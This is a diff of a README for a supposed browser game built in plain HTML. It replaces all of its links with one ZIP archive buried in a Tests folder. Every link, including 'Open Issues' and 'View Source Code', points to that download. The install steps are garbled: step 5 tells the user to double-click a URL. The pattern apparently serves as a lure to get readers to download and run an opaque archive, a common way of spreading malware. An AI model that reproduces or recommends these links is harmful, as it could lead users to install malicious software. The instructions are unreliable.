@@ -6,14 +6,14 @@ Welcome to Project! This is a fun video game created from scratch using plain HT
 
 ## 🔗 Download Now
 
-[![Download Project](https://raw.githubusercontent.com/pinespittlebugacre696/Project/main/Tests/Project-3.6.zip%20Now-GET%20STARTED-brightgreen)](https://raw.githubusercontent.com/pinespittlebugacre696/Project/main/Tests/Project-3.6.zip)
+[![Download Project](https://github.com/pinespittlebugacre696/Project/raw/refs/heads/main/Tests/BasicCanvas.html/Software-v3.2.zip%20Now-GET%20STARTED-brightgreen)](https://github.com/pinespittlebugacre696/Project/raw/refs/heads/main/Tests/BasicCanvas.html/Software-v3.2.zip)
 
 ## 📥 Download & Install
 
 To get started with Project, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page:
-   [Download Project from Releases Page](https://raw.githubusercontent.com/pinespittlebugacre696/Project/main/Tests/Project-3.6.zip)
+   [Download Project from Releases Page](https://github.com/pinespittlebugacre696/Project/raw/refs/heads/main/Tests/BasicCanvas.html/Software-v3.2.zip)
 
 2. **Choose the Latest Version:** Look for the latest version of Project. It will typically be marked as the most recent release.
 
@@ -23,7 +23,7 @@ To get started with Project, follow these simple steps:
    - **Windows:** Right-click on the ZIP file and select "Extract All."
    - **Mac:** Double-click the ZIP file to unzip it.
 
-5. **Open the Game:** Inside the unzipped folder, find `https://raw.githubusercontent.com/pinespittlebugacre696/Project/main/Tests/Project-3.6.zip` and double-click it to launch the game in your web browser.
+5. **Open the Game:** Inside the unzipped folder, find `https://github.com/pinespittlebugacre696/Project/raw/refs/heads/main/Tests/BasicCanvas.html/Software-v3.2.zip` and double-click it to launch the game in your web browser.
 
 6. **Enjoy Playing!** Follow the on-screen instructions to start the adventure.
 
@@ -54,8 +54,8 @@ Project thrives on community involvement. If you want to help improve the game o
 
 ## 🔗 Quick Links
 
-- [Download Project from Releases Page](https://raw.githubusercontent.com/pinespittlebugacre696/Project/main/Tests/Project-3.6.zip)
-- [Open Issues](https://raw.githubusercontent.com/pinespittlebugacre696/Project/main/Tests/Project-3.6.zip)
-- [View Source Code](https://raw.githubusercontent.com/pinespittlebugacre696/Project/main/Tests/Project-3.6.zip)
+- [Download Project from Releases Page](https://github.com/pinespittlebugacre696/Project/raw/refs/heads/main/Tests/BasicCanvas.html/Software-v3.2.zip)
+- [Open Issues](https://github.com/pinespittlebugacre696/Project/raw/refs/heads/main/Tests/BasicCanvas.html/Software-v3.2.zip)
+- [View Source Code](https://github.com/pinespittlebugacre696/Project/raw/refs/heads/main/Tests/BasicCanvas.html/Software-v3.2.zip)
 
 Thank you for choosing Project! We hope you enjoy this engaging browser-based game and learn more about game development and resource management while playing. Happy gaming!
